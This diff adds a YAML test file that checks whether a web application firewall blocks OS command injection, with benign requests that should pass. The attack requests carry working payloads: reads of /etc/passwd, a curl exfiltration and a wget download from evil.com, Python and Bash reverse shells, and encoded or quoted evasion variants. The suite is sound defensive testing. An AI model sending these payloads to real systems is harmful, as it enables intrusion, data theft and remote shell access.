@@ -1,0 +1,366 @@
+meta:
+  category: "Command Injection"
+  subcategory: "OS Command Injection"
+  owasp: "A03:2021, WSTG-INPV-12"
+  severity: "critical"
+
+tests:
+  - id: "cmdi-001"
+    title: "Semicolon command injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1; cat /etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-002"
+    title: "Pipe command injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1 | cat /etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-003"
+    title: "Command substitution $()"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=$(cat /etc/passwd)"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-004"
+    title: "Backtick injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=`id`"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-005"
+    title: "AND operator injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1 && whoami"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-006"
+    title: "OR operator injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1 || whoami"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-007"
+    title: "Newline injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1%0aid"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-008"
+    title: "Curl to exfiltrate data"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; curl http://evil.com/$(whoami)"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-009"
+    title: "wget command injection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; wget http://evil.com/shell.sh -O /tmp/shell.sh"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-010"
+    title: "Python reverse shell"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; python -c \"import socket,subprocess;s=socket.socket();s.connect((\\\"evil.com\\\",4444));subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\""}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-011"
+    title: "Bash reverse shell"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-012"
+    title: "Environment variable exfiltration"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "GET"
+      path: "/api/tools/lookup"
+      query_string: "host=127.0.0.1;env"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-013"
+    title: "Chained commands with redirection"
+    tags: ["cmdi", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1; cat /etc/passwd > /tmp/out.txt"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-014"
+    title: "Command injection via variable expansion"
+    tags: ["cmdi", "evasion", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=${IFS}cat${IFS}/etc/passwd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-015"
+    title: "Wildcard-based injection"
+    tags: ["cmdi", "evasion", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1;/???/??t /???/p??s?d"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-016"
+    title: "Concatenation evasion"
+    tags: ["cmdi", "evasion", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/x-www-form-urlencoded"
+      body: "host=127.0.0.1;c'a't /e'tc'/pa'ss'wd"
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-017"
+    title: "Base64 encoded command"
+    tags: ["cmdi", "evasion", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1;echo aWQ= | base64 -d | sh"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-018"
+    title: "Hex encoded command"
+    tags: ["cmdi", "evasion", "paranoia-2"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1;echo -e \\\\x69\\\\x64 | sh"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-019"
+    title: "PowerShell command injection"
+    tags: ["cmdi", "windows", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1; powershell -Command Get-Process"}'
+    expected:
+      status: 403
+      action: "block"
+
+  - id: "cmdi-020"
+    title: "cmd.exe injection"
+    tags: ["cmdi", "windows", "paranoia-1"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"127.0.0.1 & cmd /c dir"}'
+    expected:
+      status: 403
+      action: "block"
+
+  # --- Legitimate requests ---
+
+  - id: "cmdi-fp-001"
+    title: "False positive - normal hostname"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"google.com"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-002"
+    title: "False positive - normal IP address"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"192.168.1.1"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-003"
+    title: "False positive - domain with hyphens"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/tools/ping"
+      headers:
+        Content-Type: "application/json"
+      body: '{"host":"my-server.example.com"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-004"
+    title: "False positive - bash code in documentation"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/docs"
+      headers:
+        Content-Type: "application/json"
+      body: '{"content":"To check the status, run: systemctl status nginx"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-005"
+    title: "False positive - pipe symbol in text"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "q=red | green | blue color options"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-006"
+    title: "False positive - ampersand in company name"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "GET"
+      path: "/api/search"
+      query_string: "company=Johnson & Johnson"
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-007"
+    title: "False positive - semicolon in text"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/notes"
+      headers:
+        Content-Type: "application/json"
+      body: '{"note":"Meeting agenda: review Q1 results; plan Q2 strategy; discuss hiring"}'
+    expected:
+      status: 200
+      action: "allow"
+
+  - id: "cmdi-fp-008"
+    title: "False positive - backticks in markdown"
+    tags: ["cmdi", "false-positive"]
+    request:
+      method: "POST"
+      path: "/api/comments"
+      headers:
+        Content-Type: "application/json"
+      body: '{"body":"Use the `npm install` command to install dependencies"}'
+    expected:
+      status: 200
+      action: "allow"
